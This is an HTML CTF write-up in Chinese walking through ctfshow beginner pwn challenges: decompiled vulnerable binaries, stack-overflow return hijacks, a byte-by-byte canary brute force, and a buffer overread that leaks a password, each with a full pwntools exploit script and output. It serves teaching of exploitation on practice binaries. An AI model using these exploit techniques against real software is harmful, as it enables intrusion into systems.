<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> n876, <span class="type">int</span> n877)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( n876 == <span class="number">876</span> &amp;&amp; n877 == <span class="number">877</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先打开文件 “&#x2F;ctfshow_flag”，从文件中读取内容到字符数组 s 中，然后根据输入参数的值进行条件判断。如果输入参数的值满足特定条件，将读取的内容通过 printf 输出到屏幕，并返回字符串 s的指针。否则，返回文件读取的内容。</p>
<p>这里我们需要让a1 &#x3D; 0x36C 且a2 &#x3D; 0x36D,即可获得flag</p>
<p>那么我们首先需要利用栈溢出漏洞将程序流程劫持到flag函数，再满足它的条件即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(0x^c+<span class="number">4</span>)+p32(flag)+p32(<span class="number">0</span>)+p32(<span class="number">0x36c</span>)+p32(<span class="number">0x36d</span>)<span class="comment">#覆盖函数返回后的 下一个指令地址</span></span><br></pre></td></tr></table></figure>

<p>由于 payload 中传递给函数 flag 的参数满足了条件 a1 &#x3D;&#x3D; 0x36C 和 a2 &#x3D;&#x3D; 0x36D ，所以在函数内部的条件判断 if (a1 &#x3D;&#x3D; 0x36C &amp;&amp; a2 &#x3D;&#x3D; 0x36D) 将会为真，执行相应的代码块。</p>
<p>因此，通过构造特定的 payload，我们可以控制函数 flag 的执行路径，使其输出文件”&#x2F;ctfshow_flag” 中的内容。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28159)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(flag) + p32(<span class="number">0</span>) + p32(<span class="number">0x36c</span>) + p32(<span class="number">0x36d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 941</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : You should meet its conditions!</span><br><span class="line">    * *************************************</span><br><span class="line">What <span class="keyword">do</span> you want?</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x86\x85\x04\x08</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn53"><a href="#pwn53" class="headerlink" title="pwn53"></a>pwn53</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护与PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  canary();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进canary函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">canary</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/canary.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/canary.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(&amp;global_canary, <span class="number">1u</span>, <span class="number">4u</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先声明了一个指针变量 stream ，用于表示文件指针。然后，使用 fopen 函数打开名为”&#x2F;canary.txt” 的文件，以只读模式打开。如果打开失败，即文件不存在或无法打开，程序将输出一条错误信息 “&#x2F;canary.txt: No such file or directory.” 并调用 exit(0) 终止程序。</p>
<p>再使用 fread 函数从打开的文件中读取 4 个字节（32 位）的数据，并将其存储到全局变global_canary 中。 &amp;global_canary 是 global_canary 变量的地址，用于指定数据的存储位置。</p>
<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+4h] [ebp-54h] BYREF</span></span><br><span class="line">  _DWORD v2[<span class="number">8</span>]; <span class="comment">// [esp+8h] [ebp-50h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> s1; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n31; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  n31 = <span class="number">0</span>;</span><br><span class="line">  s1 = global_canary;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( n31 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)v2 + n31, <span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v2 + n31) == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++n31;</span><br><span class="line">  &#125;</span><br><span class="line">  __isoc99_sscanf(v2, <span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;global_canary, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error *** Stack Smashing Detected *** : Canary Value Incorrect!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where is the flag?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先定义了一些局部变量，包括 nbytes 、 v2 、 buf 、 s1 和 n31 。 nbytes 用于存储用户输入的字节数， v2 是一个字符数组，用于存储用户输入的内容， buf 是一个字符数组，用于存储从标准输入读取的数据。 s1 是一个整型变量，用于存储全局变量 global_canary 的值。 n31 是一个整型变量，用于控制循环。</p>
<p>再使用 read 函数从标准输入读取用户的输入，并存储到字符数组 v2 中。循环会一直进行，直到遇到换行符 \n （ASCII码为10）为止。每次读取一个字节，存储到 v2 中，并逐渐增加 n31 的值。 n31用于记录读取的字符个数。</p>
<p>接着使用 __isoc99_sscanf 函数将 v2 中的字符串转换为整数，并存储到 nbytes 中。这里使用%d 格式说明符将字符串解析为一个有符号整数。</p>
<p>使用 printf 输出提示信息 “$ “，表示等待用户输入。接着，使用 read 函数从标准输入读取nbytes 个字节的数据，并将数据存储到缓冲区 buf 中。</p>
<p>之后，代码通过比较 s1 和全局变量 global_canary 的值来检查堆栈的完整性。如果两者的值不相等，表示堆栈被破坏，输出错误信息 “Error *** Stack Smashing Detected *** : Canary ValueIncorrect!”，并调用 exit(-1) 终止程序。</p>
<p>最后，代码输出信息 “Where is the flag?”，并调用 fflush(stdout) 刷新标准输出缓冲区。</p>
<p>总结起来，这段代码的功能是从标准输入读取用户输入的字节数，并将相应字节数的数据读取到缓冲区 buf 中。然后，它会检查堆栈的完整性，如果堆栈被破坏，则输出错误信息并终止程序。我们可以看出程序是模拟了一个保护，但是由于文件名不变，其内容大概率也是不会变化的。加上题目提示猜测可以进行爆破。</p>
<p>还注意到有一个flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在爆破完成知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至flag函数就能get flag了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;/x00/x00/x00/x00&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /canary.txt &gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;critical&#x27;</span> <span class="comment">#context是pwntools中的全局配置对象，log_level 用于设置日志输出的详细程度。常见的级别从低到高为：debug（最详细）→ info → warning → error → critical（最简略）。</span></span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment">#32位Canary共4字节，逐字节泄露</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>): <span class="comment">#尝试每个可能的字节值（0-255）</span></span><br><span class="line">		io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>) <span class="comment">#程序输出&gt;(分隔符)后，-1输入【nbytes 被解析为负数时，在 32 位系统中会被转换为一个很大的无符号整数（因为 read 函数的第三个参数是无符号数），所以这句允许写入足够多的字节，触发栈溢出。】</span></span><br><span class="line">		payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(c) <span class="comment">#p8(c)将c打包1字节(8位)的字节串，p8()会发送不可见字符，如果用b&#x27;&#x27;的话我们只能发送可见字符</span></span><br><span class="line">		io.sendafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">		io.recv(<span class="number">1</span>) <span class="comment"># 跳过的是程序输出中 &quot;$ &quot; 之后、关键判断信息之前的多余字符，最可能是 换行符 \n 或空字节，去掉也能打通（不懂）</span></span><br><span class="line">		ans = io.recv()</span><br><span class="line">		<span class="built_in">print</span>(ans)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&#x27;Canary Value Incorrect!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;The index(&#123;&#125;),value(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(i,c)) </span><br><span class="line">			canary += p8(c) <span class="comment">#保存该字节</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;tring... ...&#x27;</span>) </span><br><span class="line">		io.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>,canary) </span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="comment">#填充buf缓冲区并实现栈溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p32(<span class="number">0</span>)*<span class="number">4</span> + p32(flag)<span class="comment">#p32(0)*4的作用是覆盖Canary之后到返回地址之间的所有内容</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line">栈地址              变量               大小       说明</span><br><span class="line">ebp-0x58~ebp-0x54  nbytes            4字节     用户输入的字节数</span><br><span class="line">ebp-0x50~ebp-0x30  var_50[8]         32字节    临时缓冲区(接收用户输入)</span><br><span class="line">ebp-0x30~ebp-0x10  buf[32]           32字节    目标缓冲区(存在溢出)</span><br><span class="line">ebp-0x10~ebp-0x0C  s1                4字节     canary副本(用于校验)</span><br><span class="line">ebp-0x0C~ebp-0x04  var_C             4字节    临时变量</span><br><span class="line">ebp-0x04~ebp+0x00  var_4             4字节    临时变量</span><br><span class="line">ebp+0x00~ebp+0x04  __saved_registers 4字节    保存的EBP寄存器</span><br><span class="line">ebp+0x04~ebp+0x08  __return_address  4字节    返回地址(覆盖目标)</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(0),value(47)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(1),value(120)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(2),value(48)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(3),value(48)</span><br><span class="line">canary= b<span class="string">&#x27;/x00&#x27;</span></span><br><span class="line">Where is the flag?</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h2 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h2><p>Hint：再近一点靠近点快被融化</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序关闭栈保护与PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-60h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+180h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [esp+184h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+194h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========CTFshow-LOGIN==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Username:&quot;</span>);</span><br><span class="line">  fgets(v5, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v8 = <span class="built_in">strchr</span>(v5, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(v5, <span class="string">&quot;,\nInput your Password.&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/password.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(v5);</span><br><span class="line">  fgets(s1, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>声明了一些局部变量，包括字符数组 s1 、v5 和 s ，以及文件指针 stream 、字符指针 v8 和整型指针 p_argc 。</p>
<p>接下来，使用 memset 函数将字符数组 s 、 v5 和 s1 初始化为全零。使用 fgets 函数从标准输入中读取用户输入的用户名，并存储到字符数组 v5 中。 v5的长度限制为 256 字节。接下来，使用strchr 函数在 s_ 中查找换行符 \n ，如果找到，则将其替换为字符串终止符 \0 。然后，使用strcat 函数将附加的字符串 “,\nInput your Password.” 连接到 s_ 后面。使用 fopen 函数打开名为 “&#x2F;password.txt” 的文件，以只读模式打开。如果打开失败，即文件不存在或无法打开，程序将输出一条错误信息 “&#x2F;password.txt: No such file or directory.” 并调用 exit(0) 终止程序。</p>
<p>接着，使用 fgets 函数从文件中读取一行内容（最多 64 个字符），存储到字符数组 s 中。这从”&#x2F;password.txt” 文件中读取的密码。</p>
<p>然后，使用 printf 输出欢迎信息 “Welcome “，并使用 puts 输出用户输入的用户名 v5 。</p>
<p>接下来，使用 fgets 函数从标准输入中读取用户输入的密码，并存储到字符数组 s1 中。</p>
<p>最后，将字符数组 v5 的第一个元素设置为零，清空用户输入的用户名。</p>
<p>接下来看关键部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>这部分代码使用 strcmp 函数比较用户输入的密码 s1 和从文件中读取的密码 s 是否相等。如果相等，表示密码验证成功，输出欢迎信息 “Welcome! Here’s what you want:”，然后调用 flag 函数。</p>
<p>如果不相等，表示密码验证失败，输出 “You has been banned!” 的提示信息。</p>
<p>跟进flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结起来，这段代码实现了一个简单的登录功能。它要求用户输入用户名和密码，并与预先存储在文件 “&#x2F;password.txt” 中的密码进行比较。如果密码验证成功，则输出欢迎信息并输出flag，但是并没有对用户名有啥要求。</p>
<p>那么关键就是我们如何找到password.txt内的内容</p>
<p>参数v5（存放name）和参数s（存放flag）在栈上的位置相差不远，而且给参数v5读入数据的时候可以覆盖道参数s</p>
<figure class="highlight plaintext"><figcaption><span>of main</span></figcaption><table><tr><td class="code"><pre><span class="line">-0000000000000060     _BYTE s;</span><br><span class="line">-0000000000000160     char v5;</span><br></pre></td></tr></table></figure>

<p>他们相差 0x160-0x60&#x3D;0x100 ，而且我们对v5输入的数据长度正好是0x100,可以将v5填充满，后面紧接着的就是s，main函数里的30行会将s_打印出来</p>
<p><strong>puts遇到’\x00’才停止</strong></p>
<p>将’n’替换成’x00’使得puts(v5)能正确输出输入的name，但如果输入了0x100个垃圾数据的话，会导致最后一个’n’并没有读入而导致程序在puts(v5)时会连带下面的password一起输出，这样我们就可以得到服务器上的password，所以会将password顺带着打印出来。</p>
<p>我们可以借此接收到服务器中password.txt的内容，再重新连接一次输入我们接收到的密码输入进去即可获得flag。这次用户名就随意了，小于256即可，然后再输入密码。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地自己写文件</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span>/password.txt &gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;</span> <span class="comment">#cyclic(0x100)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aa,&#x27;</span>) <span class="comment"># 定位到payload中的特征点</span></span><br><span class="line">password = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).strip()  <span class="comment"># 读取完整密码行并去除换行符</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">io.close()</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;bit&#x27;</span>) <span class="comment">#用户名</span></span><br><span class="line">io.sendline(password)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

